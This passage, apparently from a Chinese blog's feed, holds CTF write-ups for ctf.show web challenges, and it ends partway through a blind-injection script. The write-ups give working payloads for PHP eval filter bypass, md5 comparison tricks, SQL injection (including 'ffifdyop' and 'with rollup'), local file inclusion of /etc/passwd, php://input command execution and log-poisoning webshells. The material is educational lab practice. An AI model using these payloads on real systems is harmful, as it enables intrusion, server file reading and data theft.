title="解题1"></a>解题1</h5><p>查看源代码，有提示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- hint:?cmd= --&gt;</span><br></pre></td></tr></table></figure><p>尝试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=phpinfo();</span><br></pre></td></tr></table></figure><p>得到源代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">#error_reporting(0);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html lang=&quot;zh-CN&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot; /&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width  minimum-scale=1.0  maximum-scale=1.0  initial-scale=1.0&quot; /&gt;</span><br><span class="line">    &lt;title&gt;ctf.show_红包题&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;center&gt;</span><br><span class="line">    &lt;h2&gt;ctf.show_红包题&lt;/h2&gt;</span><br><span class="line">    &lt;h4&gt;where is the flag?&lt;/h4&gt;</span><br><span class="line">    &lt;/center&gt;</span><br><span class="line">    &lt;!-- hint:?cmd= --&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">        if(isset($_GET[&#x27;cmd&#x27;]))&#123;</span><br><span class="line">            $cmd=$_GET[&#x27;cmd&#x27;];</span><br><span class="line">            highlight_file(__FILE__);</span><br><span class="line">            if(preg_match(&quot;/[A-Za-oq-z0-9$]+/&quot;,$cmd))&#123;</span><br><span class="line">                die(&quot;cerror&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            if(preg_match(&quot;/\~|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\&#123;|\&#125;|\[|\]|\&#x27;|\&quot;|\:|\,/&quot;,$cmd))&#123;</span><br><span class="line">                die(&quot;serror&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            eval($cmd);</span><br><span class="line">        &#125;</span><br><span class="line">     ?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>代码审计可知，要输入参数cmd，但对cmd拦截了除p外的所有字母数字，以及大部分特殊符号：</p><p>这题的解题思路是：构造文件上传，传一个这样的.txt文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#！ /bin/bash</span><br><span class="line"></span><br><span class="line">cat /flag.txt</span><br></pre></td></tr></table></figure><p>根据PHP的特性，即使当前页面没有文件上传接口，程序仍然会将文件上传至服务器的tmp目录，生成一个&#x2F;tmp&#x2F;phpxxxx.tmp的文件，并在上传操作完成后删除他。</p><p>因此可以利用这一点，再tmp文件未删除之前，使用代码执行漏洞调用他。</p><p>构造文件上传：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: multipart/form-data; boundary=---------------------------10242300956292313528205888</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Length: 242//文件大小需要精确，不能大也不能小</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-----------------------------10242300956292313528205888</span><br><span class="line">Content-Disposition: form-data; name=&quot;fileUpload&quot;; filename=&quot;1.txt&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">#! /bin/bash</span><br><span class="line"></span><br><span class="line">cat /flag.txt</span><br><span class="line">-----------------------------10242300956292313528205888--</span><br></pre></td></tr></table></figure><p>参数请求：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST /?cmd=?&gt;&lt;?=`.+/??p/p?p??????`;</span><br></pre></td></tr></table></figure><p>?&gt;将前面的&lt;?闭合掉</p><?=是echo的另一种写法``用来绕过单引号双引号拦截.+/??p/p?p??????表示模糊匹配. /tmp/phpxxxx.tmp//这里我不是很明白为什么是6个问号，按照一般php临时文件为phpxxxx.tmp的格式，p?p后面应该跟8个问号才对.上句开头中的点是source的另一种引用方法，所以最终执行的内容应该是：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST /?cmd=echo `source /tmp/phpxxxx.tmp`;</span><br></pre></td></tr></table></figure>即读取临时文件中的cat /flag.txt并执行，打印得到flag##### 解题2使用payload：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=?&gt;&lt;?=`/???/?p /???????? p.ppp`;?&gt;</span><br></pre></td></tr></table></figure>相当于执行了：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=?&gt;&lt;?=`/bin/cp /flag.txt p.ppp`;?&gt;</span><br></pre></td></tr></table></figure>然后访问URL/p.ppp下载文件即可获得flag]]></content>
      
      
      <categories>
          
          <category> 1.CTF </category>
          
          <category> 1.日常练习 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>代码审计</title>
      <link href="/2021/10/28/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
      <url>/2021/10/28/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h5 id="题型"><a href="#题型" class="headerlink" title="题型"></a>题型</h5><p>代码审计，md5碰撞</p><h5 id="链接1"><a href="#链接1" class="headerlink" title="链接1"></a>链接1</h5><p><a href="https://ctf.show/challenges">https://ctf.show/challenges</a> –&gt; web5</p><h5 id="解题1"><a href="#解题1" class="headerlink" title="解题1"></a>解题1</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html lang=<span class="string">&quot;zh-CN&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=UTF-8&quot;</span> /&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, minimum-scale=1.0, maximum-scale=1.0, initial-scale=1.0&quot;</span> /&gt;</span><br><span class="line">    &lt;title&gt;ctf.show_web5&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;center&gt;</span><br><span class="line">    &lt;h2&gt;ctf.show_web5&lt;/h2&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    &lt;h3&gt;</span><br><span class="line">    &lt;/center&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">        <span class="variable">$flag</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">        <span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="title function_ invoke__">ctype_alpha</span>(<span class="variable">$v1</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;v1 error&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;v2 error&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$v1</span>)==<span class="title function_ invoke__">md5</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;where is flag?&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>ctype_alpha()：检测参数是否纯字母</p><p>is_numeric()：检测参数是否数字，或纯数字字符串</p><p>题目大意是v1要纯字母构成，v2要纯数字构成，然后两者的md5值要相等。</p><p>这题考察md5碰撞，PHP中md5存在的一个漏洞是：PHP在处理哈希字符串时，它把每一个以“0E”开头的哈希值都解释为0</p><p>所以构造特殊字符串：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=QNKCDZO&amp;v2=240610708</span><br></pre></td></tr></table></figure><p>其中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">值：QNKCDZO</span><br><span class="line"> MD5：0e830400451993494058024219903391</span><br><span class="line">值：240610708</span><br><span class="line"> MD5：0e462097431906509019562988736854</span><br></pre></td></tr></table></figure><span id="more"></span><hr><h5 id="题型-1"><a href="#题型-1" class="headerlink" title="题型"></a>题型</h5><p>代码审计，md5原始16字符二进制格式碰撞，万能密码</p><h5 id="链接1-1"><a href="#链接1-1" class="headerlink" title="链接1"></a>链接1</h5><p><a href="https://ctf.show/challenges">https://ctf.show/challenges</a> –&gt; web9</p><h5 id="解题1-1"><a href="#解题1-1" class="headerlink" title="解题1"></a>解题1</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="variable">$flag</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>)&gt;<span class="number">10</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;password error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select * from user where username =&#x27;admin&#x27; and password =&#x27;&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>,<span class="literal">true</span>).<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span>=<span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>))&#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;登陆成功&lt;br&gt;&quot;</span>;</span><br><span class="line"> <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>md5()当第二个参数为true的时候表示以原始 16 字符二进制格式输出，输出一般是乱码</p><p>按照关键代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;select * from user where username =&#x27;admin&#x27; and password =&#x27;&quot;.md5($password,true).&quot;&#x27;&quot;;</span><br></pre></td></tr></table></figure><p>只要拼接在语句中的md5($password,true)有’or’xxxx格式即可，符合条件的有两个：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ffifdyop</span><br><span class="line">129581926211651571912466741651878684928</span><br></pre></td></tr></table></figure><p>但题目长度限制10以下，因此密码输入ffifdyop即可获得flag</p><hr><h5 id="题型-2"><a href="#题型-2" class="headerlink" title="题型"></a>题型</h5><p>代码审计，万能密码，with rollup特殊注入</p><h5 id="链接1-2"><a href="#链接1-2" class="headerlink" title="链接1"></a>链接1</h5><p><a href="https://ctf.show/challenges">https://ctf.show/challenges</a> –&gt; web10</p><p>参考资料：<a href="https://blog.csdn.net/miuzzx/article/details/104351624">https://blog.csdn.net/miuzzx/article/details/104351624</a></p><h5 id="解题1-2"><a href="#解题1-2" class="headerlink" title="解题1"></a>解题1</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">replaceSpecialChar</span>(<span class="params"><span class="variable">$strParam</span></span>)</span>&#123;</span><br><span class="line">             <span class="variable">$regex</span> = <span class="string">&quot;/(select|from|where|join|sleep|and|\s|union|,)/i&quot;</span>;</span><br><span class="line">             <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$regex</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$strParam</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$con</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Could not connect: &#x27;</span> . <span class="title function_ invoke__">mysqli_error</span>());</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>)!=<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">replaceSpecialChar</span>(<span class="variable">$username</span>)))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>)!=<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">replaceSpecialChar</span>(<span class="variable">$password</span>)))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select * from user where username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span>=<span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>))&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$password</span>==<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>])&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;登陆成功&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>代码审计可知，程序过滤了select、from、where、join、sleep、and、空白、union、逗号大多数sql注入关键字，而且无视大小写、对双写绕过也做了针对。</p><p>综上可以使用万能密码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;||1=1#</span><br></pre></td></tr></table></figure><p>这样就进入了if(mysqli_num_rows($result)&gt;0)条件内部，接着程序会判断密码是否符合，即所有密码中只要有一个与输入密码符合即可通过。</p><p>利用group by和with rollup可以构造一个为NULL的password，最终payload是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&#x27;/**/or/**/1=1/**/group/**/by/**/password/**/with/**/rollup#&amp;password=</span><br></pre></td></tr></table></figure><hr><h5 id="题型-3"><a href="#题型-3" class="headerlink" title="题型"></a>题型</h5><p>代码审计，$_SESSION[]考查</p><h5 id="链接1-3"><a href="#链接1-3" class="headerlink" title="链接1"></a>链接1</h5><p><a href="https://ctf.show/challenges">https://ctf.show/challenges</a> –&gt; web11</p><h5 id="解题1-3"><a href="#解题1-3" class="headerlink" title="解题1"></a>解题1</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">replaceSpecialChar</span>(<span class="params"><span class="variable">$strParam</span></span>)</span>&#123;</span><br><span class="line">             <span class="variable">$regex</span> = <span class="string">&quot;/(select|from|where|join|sleep|and|\s|union|,)/i&quot;</span>;</span><br><span class="line">             <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$regex</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$strParam</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>)!=<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">replaceSpecialChar</span>(<span class="variable">$password</span>)))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$password</span>==<span class="variable">$_SESSION</span>[<span class="string">&#x27;password&#x27;</span>])&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>过滤了注入关键字，而且没有涉及SQL查询语句。</p><p>代码审计可知，程序要求输入的密码与PHPSESSION中存储的密码一致即可，PHPSESSION是加密的，但我们可以删除本地PHPSESSION，使$_SESSION[‘password’]获取值为空，然后密码置空，即可匹配条件获得flag。</p><hr>]]></content>
      
      
      <categories>
          
          <category> 1.CTF </category>
          
          <category> 1.日常练习 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>文件包含</title>
      <link href="/2021/10/28/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
      <url>/2021/10/28/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
      
        <content type="html"><![CDATA[<h5 id="题型"><a href="#题型" class="headerlink" title="题型"></a>题型</h5><p>文件包含，php伪协议</p><h5 id="链接1"><a href="#链接1" class="headerlink" title="链接1"></a>链接1</h5><p><a href="https://ctf.show/challenges">https://ctf.show/challenges</a> –&gt; web3</p><p>参考资料：<a href="https://www.cnblogs.com/zzjdbk/p/13030717.html">https://www.cnblogs.com/zzjdbk/p/13030717.html</a></p><h5 id="解题1"><a href="#解题1" class="headerlink" title="解题1"></a>解题1</h5><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=../../../../../../../../../../../../../../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure><p>得到&#x2F;etc&#x2F;passwd内容。</p><p>使用php伪协议，payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=php://input[POST DATA]&lt;?php echo system(&#x27;ls&#x27;);?&gt;</span><br></pre></td></tr></table></figure><p>获得当前目录下所有文件名：</p><p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/image-20211028094753728.png" alt="image-20211028094753728"></p><p>访问文件名获得flag，payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=ctf_go_go_go</span><br></pre></td></tr></table></figure><span id="more"></span><hr><h5 id="题型-1"><a href="#题型-1" class="headerlink" title="题型"></a>题型</h5><p>文件包含，日志注入，远程文件包含</p><h5 id="链接2"><a href="#链接2" class="headerlink" title="链接2"></a>链接2</h5><p><a href="https://ctf.show/challenges">https://ctf.show/challenges</a> –&gt; web4</p><h5 id="解题2"><a href="#解题2" class="headerlink" title="解题2"></a>解题2</h5><p>测试发现php:&#x2F;&#x2F;、data:&#x2F;&#x2F;均被禁用</p><p>包含web服务器日志，payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure><p>发现包含成功，内容包括User-Agent等内容。</p><p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/image-20211028102156036.png" alt="image-20211028102156036"></p><p>尝试在日志中注入一句话木马，具体方方法是，burp中修改访问包，在User-Agent中插入一句话：</p><p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/image-20211028102403528.png" alt="image-20211028102403528"></p><p>再次包含日志，并用蚁剑连接后，在www目录找到了flag.txt：</p><p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/image-20211028102720663.png" alt="image-20211028102720663"></p>]]></content>
      
      
      <categories>
          
          <category> 1.CTF </category>
          
          <category> 1.日常练习 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入</title>
      <link href="/2021/10/28/SQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2021/10/28/SQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h5 id="题型"><a href="#题型" class="headerlink" title="题型"></a>题型</h5><p>SQL注入</p><h5 id="链接1"><a href="#链接1" class="headerlink" title="链接1"></a>链接1</h5><p><a href="https://ctf.show/challenges">https://ctf.show/challenges</a> –&gt; web2</p><h5 id="解题1"><a href="#解题1" class="headerlink" title="解题1"></a>解题1</h5><p>SQL联合注入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1,flag,3 from flag#</span><br></pre></td></tr></table></figure><span id="more"></span><hr><h5 id="题型-1"><a href="#题型-1" class="headerlink" title="题型"></a>题型</h5><p>SQL注入，拦截空格</p><h5 id="链接1-1"><a href="#链接1-1" class="headerlink" title="链接1"></a>链接1</h5><p><a href="https://ctf.show/challenges">https://ctf.show/challenges</a> –&gt; web6</p><h5 id="解题1-1"><a href="#解题1-1" class="headerlink" title="解题1"></a>解题1</h5><p>SQL联合注入，用&#x2F;**&#x2F;代替空格：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;/**/union/**/select/**/1,flag,3/**/from/**/flag#</span><br></pre></td></tr></table></figure><hr><h5 id="题型-2"><a href="#题型-2" class="headerlink" title="题型"></a>题型</h5><p>SQL注入，数值型注入，拦截空格</p><h5 id="链接1-2"><a href="#链接1-2" class="headerlink" title="链接1"></a>链接1</h5><p><a href="https://ctf.show/challenges">https://ctf.show/challenges</a> –&gt; web7</p><h5 id="解题1-2"><a href="#解题1-2" class="headerlink" title="解题1"></a>解题1</h5><p>SQL联合注入，用&#x2F;**&#x2F;代替空格：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1/**/union/**/select/**/1,flag,3/**/from/**/flag#</span><br></pre></td></tr></table></figure><hr><h5 id="题型-3"><a href="#题型-3" class="headerlink" title="题型"></a>题型</h5><p>SQL注入，数值型盲注，拦截空格、union、逗号、单引号</p><h5 id="链接1-3"><a href="#链接1-3" class="headerlink" title="链接1"></a>链接1</h5><p><a href="https://ctf.show/challenges">https://ctf.show/challenges</a> –&gt; web8</p><h5 id="解题1-3"><a href="#解题1-3" class="headerlink" title="解题1"></a>解题1</h5><p>空格用&#x2F;**&#x2F;代替</p><p>拦截union所以使用逻辑盲注</p><p>逗号拦截的应对是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mid(string,1,2)变成mid(string/**/from/**/1/**/for/**/2)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">limit 2,1变成limit/**/1/**/offset/**/2</span><br></pre></td></tr></table></figure><p>用到单引号的场景改为使用双引号</p><p>最终获得flag使用的脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span 